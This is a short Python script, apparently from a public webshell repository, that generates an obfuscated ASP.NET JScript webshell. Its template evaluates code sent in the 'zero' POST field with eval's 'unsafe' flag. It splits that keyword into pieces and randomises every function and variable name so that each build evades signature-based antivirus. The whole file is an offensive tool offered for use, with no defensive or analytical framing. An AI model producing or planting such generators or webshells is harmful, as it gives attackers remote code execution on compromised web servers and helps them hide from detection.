import random

#author: pureqh
#github: https://github.com/pureqh/webshell

shell = '''<%@ Page Language="Jscript" Debug=true%>
<%
function {2}()
{6}
var {0}=Request.Form["zero"];
return {0};
{7}
function {3}()
{6}
var {1}="unsa",{5}="fe",{4}={1}+{5};
eval({2}(),{4});
{7}
{3}()
%>'''



def random_name(len):
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))   
    
def build_webshell():
    parameter = random_name(4)
    parameter1 = random_name(4)
    FunctionName = random_name(4)
    FunctionName1 = random_name(4)
    parameter2 = random_name(4)
    parameter3 = random_name(4)
    lef = '''{'''
    rig = '''}'''
    shellc = shell.format(parameter,parameter1,FunctionName,FunctionName1,parameter2,parameter3,lef,rig)
    return shellc


if __name__ == '__main__':
    print (build_webshell())